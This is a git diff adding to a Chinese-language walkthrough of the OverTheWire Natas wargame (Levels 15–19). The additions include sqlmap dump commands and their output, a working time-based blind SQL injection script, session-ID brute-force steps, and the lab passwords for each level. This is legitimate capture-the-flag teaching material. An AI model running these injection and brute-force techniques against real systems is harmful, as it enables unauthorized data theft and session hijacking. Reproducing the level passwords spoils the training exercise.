@@ -1058,11 +1058,38 @@ title: OverTheWire：Natas
       key += table[ans]
   print(key)
   ```
+- 也可以使用`sqlmap`
+  ```bash
+  # 枚举数据库
+  $ sqlmap -u http://natas15.natas.labs.overthewire.org/index.php --auth-type=basic --auth-cred=natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J --data=username=natas16 --dbms=mysql --level=5 --dbs
+  ...
+  available databases [2]:
+  [*] information_schema
+  [*] natas15
+  ...
+
+  # 表名已知，直接获取 users 表
+  $ sqlmap -u http://natas15.natas.labs.overthewire.org/index.php --auth-type=basic --auth-cred=natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J --data=username=natas16 --dbms=mysql --level=5 -D natas15 -T users --dump
+  ...
+  Database: natas15
+  Table: users
+  [4 entries]
+  +----------+----------------------------------+
+  | username | password                         |
+  +----------+----------------------------------+
+  | bob      | 6P151OntQe                       |
+  | charlie  | HLwuGKts2w                       |
+  | alice    | hROtsfM734                       |
+  | natas16  | WaIHEacj63wnNIBROHeqi3p9t0m5nhmh |
+  +----------+----------------------------------+
+  ...
+  ```
 
 ### 参考资料
 
 - [What is Blind SQL Injection? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/sql-injection/blind)
 - [How can I make SQL case sensitive string comparison on MySQL? - Stack Overflow](https://stackoverflow.com/a/5629121/13542937)
+- [Usage · sqlmapproject/sqlmap Wiki](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
 
 ## Level 16
 
@@ -1155,3 +1182,274 @@ title: OverTheWire：Natas
               break
   print(key)
   ```
+
+## Level 17
+
+<table>
+<tbody>
+  <tr>
+    <td>Username</td>
+    <td>natas17</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>Password</td>
+    <td>8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>URL</td>
+    <td>http://natas17.natas.labs.overthewire.org</td>
+  </tr>
+</tbody>
+</table>
+
+- 前端同 [Level 15](#level-15)，输入用户名，检查该用户是否存在
+- 查看源代码，发现查询结果输出部分都被注释掉了
+  ```html
+  <html>
+  <head>
+  <!-- This stuff in the header has nothing to do with the level -->
+  </head>
+  <body>
+  <h1>natas17</h1>
+  <div id="content">
+  <?
+
+  /*
+  CREATE TABLE `users` (
+    `username` varchar(64) DEFAULT NULL,
+    `password` varchar(64) DEFAULT NULL
+  );
+  */
+
+  if(array_key_exists("username", $_REQUEST)) {
+      $link = mysql_connect('localhost', 'natas17', '<censored>');
+      mysql_select_db('natas17', $link);
+
+      $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+      if(array_key_exists("debug", $_GET)) {
+          echo "Executing query: $query<br>";
+      }
+
+      $res = mysql_query($query, $link);
+      if($res) {
+      if(mysql_num_rows($res) > 0) {
+          //echo "This user exists.<br>";
+      } else {
+          //echo "This user doesn't exist.<br>";
+      }
+      } else {
+          //echo "Error in query.<br>";
+      }
+
+      mysql_close($link);
+  } else {
+  ?>
+
+  <form action="index.php" method="POST">
+  Username: <input name="username"><br>
+  <input type="submit" value="Check existence" />
+  </form>
+  <? } ?>
+  <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+  </div>
+  </body>
+  </html>
+  ```
+- 可以基于时间延迟进行 SQL 盲注
+  ```py
+  #!/usr/bin/python
+  # -*- coding: UTF-8 -*-
+
+  import requests
+  from lxml import etree
+
+  auth_username = 'natas17'
+  auth_password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
+  url = 'http://natas17.natas.labs.overthewire.org'
+
+  table = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
+
+  key = ''
+  for i in range(1, 33):
+      l, r = 0, 61
+      while l <= r:
+          mid = (l + r) >> 1
+          ch = table[mid]
+          while True:
+              res = requests.post(url + '/index.php', {'username' : '" UNION SELECT * FROM users WHERE username = "natas18" and ascii(SUBSTRING(password, %d, 1)) >= ascii("%s") and sleep(2)#' % (i, ch)}, auth = (auth_username, auth_password), headers={'Connection':'close'})
+              if res.status_code == 200:
+                  break
+          if res.elapsed.seconds >= 2:
+              l = mid + 1
+              ans = mid
+          else:
+              r = mid - 1
+      key += table[ans]
+  print(key)
+  ```
+
+## Level 18
+
+<table>
+<tbody>
+  <tr>
+    <td>Username</td>
+    <td>natas18</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>Password</td>
+    <td>xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>URL</td>
+    <td>http://natas18.natas.labs.overthewire.org</td>
+  </tr>
+</tbody>
+</table>
+
+- 提示需要使用管理员账号登录才能获得下一关口令<br>
+![Please login with your admin account to retrieve credentials for natas19](img/natas37.jpg)
+- 原本管理员是通过用户名来判断，但由于这种方法不安全，`isValidAdminLogin()`中的关键语句被注释，任何情况下都会返回 0
+  ```html
+  <html>
+  <head>
+  <!-- This stuff in the header has nothing to do with the level -->
+  </head>
+  <body>
+  <h1>natas18</h1>
+  <div id="content">
+  <?
+
+  # 这里有点意思，640 明显很小耶 (ŏωŏ)
+  $maxid = 640; // 640 should be enough for everyone
+
+  function isValidAdminLogin() { /* {{{ */
+      if($_REQUEST["username"] == "admin") {
+      /* This method of authentication appears to be unsafe and has been disabled for now. */
+          //return 1;
+      }
+
+      return 0;
+  }
+  /* }}} */
+  function isValidID($id) { /* {{{ */
+      return is_numeric($id);
+  }
+  /* }}} */
+  function createID($user) { /* {{{ */
+      global $maxid;
+      return rand(1, $maxid);
+  }
+  /* }}} */
+  function debug($msg) { /* {{{ */
+      if(array_key_exists("debug", $_GET)) {
+          print "DEBUG: $msg<br>";
+      }
+  }
+  /* }}} */
+  function my_session_start() { /* {{{ */
+      if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
+      if(!session_start()) {
+          debug("Session start failed");
+          return false;
+      } else {
+          debug("Session start ok");
+          if(!array_key_exists("admin", $_SESSION)) {
+          debug("Session was old: admin flag set");
+          $_SESSION["admin"] = 0; // backwards compatible, secure
+          }
+          return true;
+      }
+      }
+
+      return false;
+  }
+  /* }}} */
+  function print_credentials() { /* {{{ */
+      if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+      print "You are an admin. The credentials for the next level are:<br>";
+      print "<pre>Username: natas19\n";
+      print "Password: <censored></pre>";
+      } else {
+      print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
+      }
+  }
+  /* }}} */
+
+  $showform = true;
+  if(my_session_start()) {
+      print_credentials();
+      $showform = false;
+  } else {
+      if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
+      session_id(createID($_REQUEST["username"]));
+      session_start();
+      $_SESSION["admin"] = isValidAdminLogin();
+      debug("New session started");
+      $showform = false;
+      print_credentials();
+      }
+  }
+
+  if($showform) {
+  ?>
+
+  <p>
+  Please login with your admin account to retrieve credentials for natas19.
+  </p>
+
+  <form action="index.php" method="POST">
+  Username: <input name="username"><br>
+  Password: <input name="password"><br>
+  <input type="submit" value="Login" />
+  </form>
+  <? } ?>
+  <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+  </div>
+  </body>
+  </html>
+  ```
+- 用户的 PHPSESSID 是范围在 $[1, 640]$，那么只要暴力找到`admin`的 PHPSESSID 就好了(<ゝωΦ)<br>
+![Intruder Payload - PHPSESSID](img/natas38.jpg)<br>
+![4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs](img/natas39.jpg)
+
+## Level 19
+
+<table>
+<tbody>
+  <tr>
+    <td>Username</td>
+    <td>natas19</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>Password</td>
+    <td>4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>URL</td>
+    <td>http://natas19.natas.labs.overthewire.org</td>
+  </tr>
+</tbody>
+</table>
+
+- session ID 不再连续了……<br>
+![This page uses mostly the same code as the previous level, but session IDs are no longer sequential...](img/natas40.jpg)
+- 通过观察发现，新的 PHPSESSID 的格式为`随机1~3位数字 + "-" + 用户名`的 ASCII 码字符串<br>
+![BurpSuite Sequencer 分析结果](img/natas41.jpg)
+- 接下来就是暴力枚举 1 至 3 位的随机数字<br>
+![Intruder - Positions](img/natas42.jpg)<br>
+![Intruder - Payloads](img/natas43.jpg)
+- 经过很长一段时间的枚举……(<ゝωΦ)<br>
+![eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF](img/natas44.jpg)
